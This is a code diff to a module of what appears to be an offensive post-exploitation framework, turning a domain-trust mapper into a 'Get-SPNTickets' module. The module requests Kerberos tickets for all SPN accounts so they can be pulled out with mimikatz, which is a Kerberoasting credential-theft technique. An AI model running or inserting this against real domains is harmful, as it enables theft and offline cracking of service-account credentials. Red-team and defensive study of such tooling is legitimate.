@@ -5,11 +5,11 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {
-            'Name': 'Invoke-MapDomainTrust',
+            'Name': 'Get-SPNTickets',
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Maps all reachable domain trusts with .CSV output. Part of PowerView.'),
+            'Description': ('Requests kerberos tickets for all users with a non-null service principal name (SPN). These tickets can be extracted with credentials/mimikatz/extract_tickets.'),
 
             'Background' : True,
 
@@ -33,16 +33,6 @@ class Module:
             'Agent' : {
                 'Description'   :   'Agent to run module on.',
                 'Required'      :   True,
-                'Value'         :   ''
-            },
-            'LDAP' : {
-                'Description'   :   'Switch. Use LDAP for domain queries (less accurate).',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'DomainController' : {
-                'Description'   :   'Domain controller to reflect LDAP queries through.',
-                'Required'      :   False,
                 'Value'         :   ''
             }
         }
@@ -75,19 +65,8 @@ class Module:
         f.close()
 
         # get just the code needed for the specified function
-        script = helpers.generate_dynamic_powershell_script(moduleCode, moduleName)
+        script = helpers.generate_dynamic_powershell_script(moduleCode, ["Get-NetUser", "Request-SPNTicket"])
 
-        script += moduleName + " "
-
-        for option,values in self.options.iteritems():
-            if option.lower() != "agent":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
-                        # if we're just adding a switch
-                        script += " -" + str(option)
-                    else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
-
-        script += '| ConvertTo-Csv -NoTypeInformation | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
+        script += ' Get-NetUser | Request-SPNTicket | Out-String | %{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
 
         return script
